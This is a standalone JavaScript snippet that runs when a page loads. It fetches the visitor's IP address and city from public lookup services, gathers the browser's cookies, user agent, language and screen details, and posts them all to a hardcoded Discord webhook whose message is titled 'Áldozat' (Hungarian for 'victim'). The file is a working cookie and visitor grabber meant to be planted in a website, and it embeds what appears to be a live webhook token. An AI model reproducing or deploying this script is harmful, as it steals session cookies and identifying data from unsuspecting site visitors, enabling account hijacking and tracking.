document.addEventListener("DOMContentLoaded", function () {
  const webhookURL =
    "https://discord.com/api/webhooks/1262915037543141388/6OH_1CsadYdJNdA0mKPGD-fw8MOf-V8UDShu3v_nUQGQK8a-6SVxkEWibZqBaTp9ZNCf";

  function getCookies() {
    const cookies = document.cookie.split(";").reduce((cookies, cookie) => {
      const [name, value] = cookie.split("=").map((c) => c.trim());
      cookies[name] = value;
      return cookies;
    }, {});
    return JSON.stringify(cookies, null, 2);
  }

  function getUserAgent() {
    return navigator.userAgent;
  }

  function getLanguage() {
    return navigator.language;
  }

  function getScreenInfo() {
    return {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
    };
  }

  function sendToDiscord(ip, city, cookies, userAgent, language, screenInfo) {
    const request = new XMLHttpRequest();
    request.open("POST", webhookURL);
    request.setRequestHeader("Content-type", "application/json");

    const params = {
      embeds: [
        {
          title: "Áldozat",
          fields: [
            {
              name: "IP Address",
              value: ip,
              inline: false,
            },
            {
              name: "City",
              value: city,
              inline: false,
            },
            {
              name: "Cookies",
              value: `\`\`\`${cookies}\`\`\``,
              inline: false,
            },
            {
              name: "User Agent",
              value: userAgent,
              inline: false,
            },
            {
              name: "Language",
              value: language,
              inline: false,
            },
            {
              name: "Screen Info",
              value: `Width: ${screenInfo.width}, Height: ${screenInfo.height}, Color Depth: ${screenInfo.colorDepth}, Pixel Depth: ${screenInfo.pixelDepth}`,
              inline: false,
            },
          ],
        },
      ],
    };

    request.send(JSON.stringify(params));
  }

  function getIpInfo(ip) {
    const request = new XMLHttpRequest();
    request.open("GET", `https://ipapi.co/${ip}/json/`, true);
    request.onload = function () {
      if (request.status >= 200 && request.status < 400) {
        const data = JSON.parse(request.responseText);
        const city = data.city || "Unknown";
        const cookies = getCookies();
        const userAgent = getUserAgent();
        const language = getLanguage();
        const screenInfo = getScreenInfo();
        sendToDiscord(ip, city, cookies, userAgent, language, screenInfo);
      } else {
        sendToDiscord(
          ip,
          "Unknown",
          getCookies(),
          getUserAgent(),
          getLanguage(),
          getScreenInfo()
        );
      }
    };
    request.onerror = function () {
      sendToDiscord(
        ip,
        "Unknown",
        getCookies(),
        getUserAgent(),
        getLanguage(),
        getScreenInfo()
      );
    };
    request.send();
  }

  const request = new XMLHttpRequest();
  request.open("GET", "https://api64.ipify.org?format=json", true);
  request.onload = function () {
    if (request.status >= 200 && request.status < 400) {
      const data = JSON.parse(request.responseText);
      const ip = data.ip;
      getIpInfo(ip);
    }
  };
  request.onerror = function () {
    console.error("Error fetching IP address.");
  };
  request.send();
});
